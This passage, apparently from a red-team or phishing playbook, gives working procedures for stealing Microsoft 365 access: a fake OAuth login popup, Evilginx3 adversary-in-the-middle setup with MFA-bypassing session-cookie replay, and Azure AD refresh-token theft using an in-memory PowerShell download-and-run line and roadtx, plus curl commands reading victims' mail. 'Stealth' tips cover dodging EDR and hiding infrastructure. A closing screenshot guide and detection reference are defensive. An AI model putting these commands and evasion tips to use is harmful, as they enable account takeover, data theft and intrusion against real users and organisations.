Credentials entered in the iframe POST to your server. The victim sees `microsoft.com` in the address bar.

> **Stealth:** The weakness is drag — the victim can try to drag the popup out of the browser window, which fails because it's not a real window. Disable drag by intercepting `mousedown` on the window chrome and calling `preventDefault`. Also intercept right-click on the fake address bar. Most users never try to drag OAuth popups, but the savvier ones will try.

### AiTM with Evilginx3 — Full Session Token Capture

Evilginx3 is a full man-in-the-browser proxy built specifically for AiTM attacks. Unlike mitmdump, it uses pre-built phishlets for every major SSO provider, handles cookie capture automatically, and manages the lure URL generation lifecycle.

```bash
# Install
wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-linux-amd64.tar.gz
tar xf evilginx-linux-amd64.tar.gz

# Start with phishlets directory
./evilginx -p ./phishlets/

# Configure (in Evilginx3 console)
config domain yourdomain.com
config ipv4 [your server IP]

# Set up O365 phishlet
phishlets hostname o365 auth.account-secure.yourdomain.com
phishlets enable o365

# Create a lure (unique per-victim URL)
lures create o365
lures get-url 0
```

Send the victim the lure URL. They see the real Microsoft login. They enter their password. They complete their Authenticator push notification (real MFA, real Microsoft server). They get their real inbox. You get:

```
sessions

ID  | Username           | Password     | Tokens
----|--------------------|--------------|---------
1   | bilbo_hr@cdbc.local| !@qwe12ASD   | access, refresh, PRT
```

Replay the session token:

```
sessions 1
# Copy the token from the output
```

Open Firefox → DevTools → Storage → Cookies → import the captured cookie for `microsoft.com`. Refresh. You're authenticated as the victim, MFA already completed, full session active.

> **Stealth:** The phishlet must return 404 on any path that isn't a valid lure URL. This prevents Evilginx3's infrastructure from being discovered by automated phishing infrastructure scanners. Set this in the phishlet config. Run Evilginx3 behind Cloudflare — Cloudflare's IP ranges absorb port scans and DDoS attempts, and their TLS termination means the actual server IP is never exposed. Rotate domains after each campaign; burned domains get flagged in Threat Intelligence feeds within 24–72 hours of victim reports.

### Azure AD Primary Refresh Token (PRT) Theft

Once you have local code execution on any Azure AD-joined or Hybrid Azure AD-joined Windows machine, the PRT is the highest-value credential available. It's a long-lived, device-bound token that can generate access tokens for any cloud resource without re-authenticating or triggering MFA. The token is stored in LSASS and can be extracted from memory.

**Extraction via AADInternals:**

```powershell
# Load into memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.3/AADInternals.ps1')

# Extract PRT from LSASS via the CloudAP plugin
$prt = Get-AADIntUserPRTToken
$nonce = Invoke-AADIntDeviceTransportKeyRequest

# Mint a new access token using the PRT
$token = New-AADIntUserPRTToken -RefreshToken $prt -GetNonce
```

**roadtx — more flexible PRT handling:**

```bash
pip3 install roadtx

# Extract PRT using roadtx
roadtx prt -a get --username bilbo_hr@cdbc.local

# Use PRT to get access tokens for any resource
roadtx prt -a use --prt [PRT_VALUE] --resource https://graph.microsoft.com
```

With the access token, you access the full M365 stack:

```bash
# Read email via Graph API
curl -H "Authorization: Bearer [token]" https://graph.microsoft.com/v1.0/me/messages

# Download SharePoint files
curl -H "Authorization: Bearer [token]" "https://graph.microsoft.com/v1.0/sites/[siteid]/drive/root/children"

# Enumerate Azure resources
az login --service-principal --username [appId] --password [token] --tenant [tenantId]
```

> **Stealth:** PRT extraction touches LSASS, which triggers EDR memory scan events on modern Defender for Endpoint configurations. Use `roadtx` instead of direct LSASS access where possible — it works via the CloudAP authentication API rather than memory reads. If LSASS access is unavoidable, use a direct syscall implementation (like NanoDump or SilentMoonwalk) that bypasses user-mode EDR hooks. The PRT itself is encrypted with the device's TPM-backed transport key — extraction only works if you have SYSTEM on the target machine, and the token is only valid from that specific device.

---

## Screenshot Documentation Guide

Every screenshot should prove a claim in the report. Before taking a screenshot, ask: "what single fact does this prove?" If you can't answer, you don't need the screenshot.

**Tool recommendation:** Flameshot (`flameshot gui`) on Linux. Supports inline annotation (arrows, rectangles, text, blur) without exporting to an image editor. `flameshot full -c` captures the full screen to clipboard for fast iteration.

**Redaction rules:**
- Blur real IPs outside the lab range with Flameshot's blur tool
- Replace actual passwords with `[REDACTED]` using the text tool — but leave enough visible to show the format
- Keep usernames visible — they're findings, not secrets

---

**01 — Service discovery (nmap or cert scan)**
Capture the certificate Subject field. Highlight it. Annotation: "Internal domain name extracted from TLS certificate without authentication." This is the foundation for everything that follows.

**02 — Exchange endpoint map**
Browser screenshots of OWA, EWS, and ActiveSync responding (even just HTTP 401 responses). Three screenshots showing three attack surfaces.

**03 — Username timing differential**
Burp Intruder: results table sorted by "Response received" with valid usernames clustered at >800ms and invalid ones at <150ms. Draw a horizontal line between the two clusters.

**04 — Password spray hit**
ffuf or ruler terminal with the valid credential line highlighted. Circle the matched FUZZ1 and FUZZ2 values.

**05 — GAL extraction count**
Terminal output of `Get-GlobalAddressList` or `impacket-exchanger`. Annotation: "X mailbox accounts extracted using a single low-privilege credential." The count is the impact statement.

**06 — OWA authenticated inbox**
Browser showing the victim's inbox. Blur all email subject lines and sender names — you've demonstrated access, no need to expose content.

**07 — RDP access with privilege**
NetExec output showing `(Pwn3d!)` marker. Then xfreerdp window showing the remote desktop. Two screenshots: credential validated, session established.

**08 — ProxyNotShell RCE**
Three-screenshot chain: (1) exploit terminal running, (2) HTTP server log showing download request, (3) curl webshell response showing `nt authority\system`. This sequence is the complete proof chain for an unauthenticated SYSTEM shell.

**09 — NTLM hash captured**
Responder or impacket-smbserver output showing the hash with username and domain highlighted. Blur or partially redact the hash value itself — the format and source prove the finding.

**10 — Hash cracked**
Hashcat output showing the cracked password. Include the `-m 5600` flag in frame to identify hash type.

**11 — NTLM relay result**
ntlmrelayx output showing the target action completed (user escalated, command executed). This screenshot distinguishes relay from capture — the impact is immediate, no cracking required.

**12 — HTML smuggling delivery**
Browser showing automatic download triggered. Simultaneously, your web server log showing only one request (for the HTML page) — this proves the payload came from within the page, not a second download.

**13 — ISO MOTW bypass**
NTFS alternate data stream check: `dir /r` on a normal downloaded file (shows Zone.Identifier), then the same command on the extracted ISO file (no Zone.Identifier). Annotation: "SmartScreen cannot flag files without MOTW." Then show the execution.

**14 — Template injection — clean document**
VirusTotal or Windows Defender scan of the weaponized DOCX showing 0 detections. Annotation: "Document passes all static analysis. Macro delivered at runtime via remote template."

**15 — C2 beacon received**
Havoc/Cobalt Strike/Metasploit session appearing. Include hostname, domain, username, process context, and privilege level in frame. This is the deliverable — everything before it was the path.

**16 — Evilginx3 session with token**
`sessions` output showing captured credentials and tokens. Annotation: "Session token captured after MFA completion. Replayed to access victim's M365 tenant without re-authentication."

**17 — PRT token usage**
Graph API response showing email or resource access using the minted access token. This demonstrates the full cloud access scope obtained from a single endpoint compromise.

---

## Detection Reference

Each technique above has reliable detection signatures. Know them — both to brief your client and to understand when you've likely been spotted.

**Exchange spray detection:** Failed OWA auth logs cluster by IP across many different usernames within a short window. Successful auth from an IP that generated prior failures. EAS auth from unknown IP with mobile User-Agent is worth logging even if not alerting.

**RDP brute force:** Event ID 4625 (Logon Type 10), multiple accounts, same source IP within any 10-minute window. Event 4624 immediately following 4625s from the same source.

**NTLM relay:** SMB signing audit on all hosts. Any SMB connection accepted without signing on a domain-joined machine is a relay risk. ntlmrelayx activity appears as unusual LDAP modifications or new local accounts — query for user creation events (4720) and privilege additions (4728) correlated with inbound SMB connections.

**ProxyNotShell/webshell:** HTTP requests to `/aspnet_client/` with POST parameters. Exchange Application event logs for unexpected PowerShell remoting sessions. Any process created by `w3wp.exe` with a suspicious command line.

**OAuth device code abuse:** Azure AD SignInLogs: device code flow authentications where the initiation IP doesn't match the approval IP. Time between code generation and approval under 5 minutes (automated tooling is instant; real users take minutes).

**AiTM / Evilginx3:** Impossible travel in Azure AD sign-in logs. Token replayed from a new IP immediately after session token issuance. Microsoft Sentinel: `SigninLogs | where RiskEventTypes_V2 contains "unfamiliarFeatures"`.

**PRT theft:** Defender for Endpoint alerts on LSASS memory access. Azure AD Conditional Access evaluation showing a PRT used from an unusual device or location. The PRT is device-bound — if it appears being used from two different devices, theft is confirmed.
